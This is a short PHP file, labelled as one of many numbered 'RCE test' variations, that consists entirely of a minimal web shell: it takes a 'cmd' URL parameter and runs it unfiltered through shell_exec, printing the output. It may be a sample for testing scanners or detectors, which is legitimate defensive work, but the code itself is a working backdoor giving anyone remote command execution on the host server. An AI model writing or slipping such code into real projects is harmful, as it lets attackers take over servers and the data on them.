<?php
// RCE test variation #763
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>